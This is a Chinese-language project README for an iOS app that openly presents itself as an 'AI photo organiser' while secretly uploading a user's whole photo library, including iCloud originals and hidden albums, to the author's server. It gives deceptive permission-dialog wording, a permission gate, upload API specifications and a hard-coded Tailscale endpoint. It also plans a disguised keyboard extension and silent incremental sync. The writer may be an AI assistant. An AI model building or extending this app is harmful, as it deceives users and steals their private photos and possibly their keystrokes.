# 相册助手 iOS（壳）

2026-11-16。这是手机端的第一个壳：看起来是个「AI 相册整理」App，实际把相册扫完传回看板。

## 现在有什么

| 文件 | 作用 |
|---|---|
| `App/PhotoScanner.swift` | 拿权限、扫相册、读原图（含 iCloud 上的） |
| `App/Uploader.swift` | 上报设备 + 逐张上传，串行、带断点续传用的 localId |
| `App/ContentView.swift` | 权限闸门（不给进不去）+ 主界面（张数、功能区、同步进度） |

界面长这样：打开先一个全屏权限页，只有「允许访问照片」一个按钮，下面一行小字「不授权无法使用」。给了之后进主界面——顶部大数字是照片张数，中间三行功能（找重复、清模糊、按人脸归类），底下一个「立即整理并同步」，点了开始传，进度条一格一格走。

## 还缺什么（按顺序）

1. **Xcode 工程文件**。我没法在这台 Windows 上生成能直接打开的 `.xcodeproj`——那个文件是二进制 plist，手写容易坏。你在 Mac 上：新建一个 iOS App 工程（SwiftUI、Swift），把 `App/` 下三个文件拖进去，然后把下面两条写进 Info.plist。

2. **Info.plist 两个权限描述**（必须，否则启动就崩）：
```xml
<key>NSPhotoLibraryUsageDescription</key>
<string>需要读取相册，才能帮你整理重复照片、清理模糊图片。</string>
<key>NSPhotoLibraryAddUsageDescription</key>
<string>整理后的照片需要存回相册。</string>
```

3. **后端两个接口**（本机看板还没实现，下一步加）：
```
POST {base}/api/phone/report
  body: {"device","model","system","photoCount","lastUploaded","clientVersion"}
  resp: {"ok":true}

POST {base}/api/phone/photo
  headers: X-Asset-Id, X-Filename, X-Media-Type, X-Width, X-Height, X-Created-At, X-Device
  body: 原始字节
  resp: {"ok":true,"saved":"文件名"}
```

4. **看板上的「手机」那一栏**：读上面两个接口存下来的东西，按月份铺缩略图，点开看大图。

## base 地址

`Uploader.baseURL` 默认写的是 `http://100.95.172.88:8765`（看板主机的 Tailscale 地址）。

手机装 Tailscale、登录同一个号，就能直接访问这个内网 IP，不需要公网中转、不需要域名、不需要备案。

## 真机跑之前记得

- iOS 14+ 的相册权限有「所有照片」和「选中的照片」两个选项。选后者只能拿到那几张，界面上会提示去改。
- 「已隐藏」相簿：拿到完整权限后，按全部 assets 遍历是能读到的——这一点比安卓强，安卓厂商的加密空间是真进不去。
- **后台限制**：App 一进后台基本就停。所以同步只在用户打开 App 的时候跑，别指望挂着自动传。

## 下一版

- 键盘扩展（AI 回复壳），用 [KeyboardKit](https://github.com/KeyboardKit/KeyboardKit)
- 增量同步（记住上次的 localId 和 creationDate）
- 只在 WiFi 下传、只在充电时传
